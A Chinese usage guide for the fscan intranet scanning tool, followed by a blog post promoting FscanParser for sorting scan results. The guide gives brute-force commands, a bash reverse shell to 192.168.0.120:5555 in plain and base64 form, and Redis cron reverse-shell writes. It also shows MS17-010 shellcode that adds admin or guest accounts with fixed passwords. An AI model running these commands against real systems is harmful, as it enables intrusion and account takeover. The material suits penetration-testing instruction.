# Fscan

## 简介

> 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。
> 支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。

下载地址：[https://github.com/shadow1ng/fscan](https://github.com/shadow1ng/fscan)

## 主要功能

1. 信息搜集
	- 存活探测(icmp)
	- 端口扫描
2. 爆破功能:
	- 各类服务爆破(ssh、smb、rdp等)
	- 数据库密码爆破(mysql、mssql、redis、psql、oracle等)
3. 系统信息、漏洞扫描
	1. netbios探测、域控识别
	2. 获取目标网卡信息
	3. 高危漏洞扫描(ms17010等)
4. Web探测功能:
	1. webtitle探测
	2. web指纹识别(常见cms、oa框架等)
	3. web漏洞扫描(weblogic、st2等,支持xray的poc)
5. 漏洞利用:
	1. redis写公钥或写计划任务
	2. ssh命令执行
	3. ms17017利用(植入shellcode),如添加用户等
6. 其他功能:
	1. 文件保存

## 下载

https://github.com/shadow1ng/fscan/releases

## 使用方法

### 完整参数

```
-c string      #ssh命令执行  
-cookie string  #设置cookie  
-debug int     #多久没响应,就打印当前进度(default 60)  
-domain string    #smb爆破模块时,设置域名  
-h string          #目标ip: 192.168.11.11 | 192.168.11.11-255 |192.168.11.11,192.168.11.12  
-hf string        #读取文件中的目标  
-hn string        #扫描时,要跳过的ip: -hn 192.168.1.1/24  -m string         #设置扫描模式: 
-m ssh (default "all")  
-no            #扫描结果不保存到文件中  
-nobr            #跳过sql、ftp、ssh等的密码爆破  
-nopoc          #跳过web poc扫描  
-np            #跳过存活探测  
-num int         #web poc 发包速率  (default 20)  
-o string          #扫描结果保存到哪 (default "result.txt") 
-p string          #设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")  
-pa string        #新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)  
-path string      #fcgi、smb romote file path  
-ping            #使用ping代替icmp进行存活探测  
-pn string        #扫描时要跳过的端口,as: -pn 445  
-pocname string   #指定web poc的模糊名字, -pocname weblogic 
-proxy string     #设置代理, -proxy http://127.0.0.1:8080  
-user string      #指定爆破时的用户名  
-userf string     #指定爆破时的用户名文件  
-pwd string       #指定爆破时的密码  
-pwdf string      # 指定爆破时的密码文件  
-rf string        #指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)  
-rs string         #redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)  
-silent          #静默扫描,适合cs扫描时不回显  
-sshkey string    #ssh连接时,指定ssh私钥  
-t int          #扫描线程 (default 600)  
-time int          #端口扫描超时时间 (default 3)  
-u string          #指定Url扫描  
-uf string        #指定Url文件扫描  
-wt int          #web访问超时时间 (default 5)  
-pocpath string  #指定poc路径  
-usera string   #在原有用户字典基础上,新增新用户  
-pwda string    #在原有密码字典基础上,增加新密码  
-socks5       #指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)  
-sc         #指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)

```

### 简单使用

```
fscan.exe -h [IP] #默认使用全部模块
fscan.exe -h 192.168.1.1/16 #扫描B段
fscan.exe -h 192.168.x.x -h 192.168.1.1/24 //C段
fscan.exe -h 192.168.x.x -h 192.168.1.1/16 //B段
fscan.exe -h 192.168.x.x -h 192.168.1.1/8  //A段的192.x.x.1和192.x.x.254,方便快速查看网段信息
```
其他用法
```
fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) 
fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
fscan.exe -hf ip.txt  (以文件导入)
fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)
fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)
fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389->rdp扫描)
fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (只支持简单tcp功能的代理,部分功能的库不支持设置代理)
fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具)
fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hash碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4)
fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexec无回显命令执行)
```
#### 加上netbios模块才会显示netbios的信息

```
 .\fscan64.exe -h 192.168.88.141 -m netbios
```

#### 以文件进行导入扫描

```
.\fscan64.exe -hf “路径”
.\fscan64.exe -hf .\ip.txt
#可以使用相对位置，也可以使用绝对位置
```

#### 跳过相应IP进行扫描

```
.\fscan64.exe -h 192.168.88.1/24
```

#### 对url进行扫描

```
.\fscan64.exe -u http://baidu.com
# -uf 对指定文件内的URL进行扫描
```

#### 设置代理扫描

```
.\fscan64.exe -h 192.168.88.1/24  -proxy http://127.0.0.1:8080
```

## 爆破功能

### 爆破使用

爆破功能简单使用的话直接使用即可默认调用，输入如下命令它会自动爆破扫描出来的服务

```
 .\fscan64.exe -h IP
```

### 对模块进行自定义文件爆破

```
.\fscan64.exe -h [IP] -m [模块] -p [模块对应的端口] -pwdf [密码文件] -userf [用户名文件]
```

-m的模块包含：

```
[mssql] [ms17010] [all] [portscan] [ftp] [smb] [netbios] [oracle] [redis]
[fcgi] [mem] [web] [ssh] [findnet] [icmp] [main] [rdp] [mgo] [cve20200796]
[webonly] [mysql] [psql]
```


对ssh模块进行爆破，并设置自定义文件爆破：

```
.\fscan64.exe -h IP -m ssh -p 22 -pwdf .\pwd.txt -userf .\users.txt

-pwdf 、-userf 同样也是相对位置和绝对位置都可以使用。
```

注：在进行爆破的时候是按文件里面的顺序进行爆破的，这时ssh包含多个用户，只能爆破出来第一个，要把root类的管理权限高的用户名放在文本得最上面。

附加一个扫mysql服务的：

```
 .\fscan64.exe -h IP -m mysql -np -nopoc
```

使用navicat连接

连接的前提：你目标机要开启远程连接，

mysql开启远程连接：

```
grant all privileges on *.* to 'root'@'%' identified by '123456' with grant option;		#开启一个远程连接用户为root任意IP可以连接，密码时123456
flush privileges;	#刷新用户权限
select user,host from user;		#查看用户检查是否已经更改
```

### 跳过一些扫描进行爆破

```
-nobr 		#跳过sql、ftp、ssh等爆破
-nopoc 		#跳过web poc扫描
-np 		#跳过存活检测
```

## 漏洞利用功能

### 使用ssh命令执行

```
.\fscan64.exe -h [目标IP] -c [执行的命令]
```

例如：

查看用户：

```
 .\fscan64.exe -h IP -c whoami
```

### ssh命令执行上线Necat

例如：

执行的命令：

```
bash -i >& /dev/tcp/192.168.0.120/5555 0>&1
```

编码后执行的命令（因为在powershell中执行的命令不能包含&&和&）：

```
.\fscan64.exe -h 192.168.88.130  -c "bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTIwLzU1NTUgMD4mMQo=}|{base64,-d}|{bash,-i}'"
```

注：若命令有变只需要将变化后执行的命令进行base64编码后，对上述编码后执行的命令中的base64编码进行替换即可。

### MS17-010模块利用

添加用户：

```
.\fscan64.exe -h 192.168.88.141 -m ms17010 -sc add
```

执行此命令后会生成一个用户，用户名：sysadmin 密码：1qaz@WSX!@#4

启用guest用户，并把guest用户添加到管理员组

```
.\fscan64.exe -h 192.168.88.141 -m ms17010 -sc guest
#启用后用户是guest 密码：1qaz@WSX!@#4
```



# 用于处理fscan输出结果的小工具

原创 白帽学子 

[白帽学子](javascript:void(0);)

 *2024年12月22日 08:11* *广东*

今天们聊聊最近在工作中用到的一个小工具。前阵子，我们进行了一次大规模的资产扫描，以便找出潜在的漏洞。使用的是fscan这个强大的扫描工具，结果输出了大量的信息。这时候就不得不面对一个问题：如何高效地处理这些海量的扫描结果？传统的方法打开文件逐行查找，真的让我感到疲惫。

我发现了一个轻量级的小工具，专门用于处理fscan的输出结果，尤其适合那些面对大量资产的情况。这个工具的设计思路很简单，但功能却相当实用。它支持最新版本的fscan（1.8.4）以及FscanPlus，可以让你的输出优化快人一步！

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/LYy9xnADcdjtX2tWtdITnYKHYbuMaPxjic8voyrOgiaIj8VvWIP7tiaBd5PlFoyuI4LicXTF76HibHaBxBrudBiaCYxA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

具体来说，它可以根据不同的内容类型将扫描结果分类，比如NetInfo会显示基于网卡数量的信息，对于多网卡机器的渗透尤其有帮助。而Windows部分则直观地展示了Windows机器的信息，这个对我们分析环境漏洞特别好。Web和BugList的部分更是直接聚焦在Web相关信息和潜在漏洞上，让我在进行风险评估时变得更加轻松。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/LYy9xnADcdjtX2tWtdITnYKHYbuMaPxjkQKO29VkjBjNAzQvRXoQAJ84icrwXwWWt6glEibNhhEJESur8Pn7HpTg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

最惊艳的是WeakPass模块，它不仅能够显示弱口令信息，还能直接连接并执行命令，甚至自动截图留存证据。这对我们在做渗透测试时，简直是个福音，不再需要切换到其他工具来完成这些操作，省去了不少时间精力。

把这些结果导出成文档也很方便，适合后续的报告和分析。在经历了这段时间的使用后，我真心觉得这个工具在我们的日常工作中大有裨益，能够有效提升效率，降低失误率。

想要获取工具的小伙伴可以直接**拉至文章末尾**

我们来提取并讨论上述工具描述中涉及的网络安全关键技术点：

1、资产扫描：

- - 资产扫描是网络安全管理中的基础工作之一。在进行护网、重保等活动时，了解网络中存在的设备及其安全状态至关重要。fscan作为一个高效的资产扫描工具，它能够快速识别网络中的活跃主机和服务，为后续的漏洞评估和渗透测试提供数据支持。



2、输出结果优化：

- - 面对海量的扫描结果，如何快速筛选出有用信息是关键。该工具通过分类整理不同类型的数据（如NetInfo、Windows、Web等），使得用户能更快地找到所需要的信息，而不是在冗长的文本文件中逐行查找。这种优化不仅提高了工作效率，也减少了人为错误的可能性。

3、漏洞检测与管理：

- - BugList模块直接列出存在漏洞的信息，这是漏洞管理流程中重要的一环。及时发现和修复漏洞可以显著降低企业遭受攻击的风险。此外，该模块的自动化特性（如截图留证）为后期的合规审核和报告提供了便利。

4、弱口令检测与利用：

- - WeakPass模块的出现，让弱口令的检测和利用变得更加直接。通过自动连接到使用弱口令的设备并执行命令，测试人员能够迅速验证系统的安全性。这提醒我们，在进行密码策略审计时，绝不能忽视弱口令带来的安全隐患。

5、文档导出与报告生成：

- - 将扫描结果以文档形式导出，方便后续的分析与报告制作，是参与安全活动的重要环节。清晰的报告不仅能帮助团队内部沟通，也能为外部审计提供依据。工具的这一功能简化了这一过程，提高了报告的专业性与准确性。



**下载链接**

https://github.com/teamdArk5/FscanParser

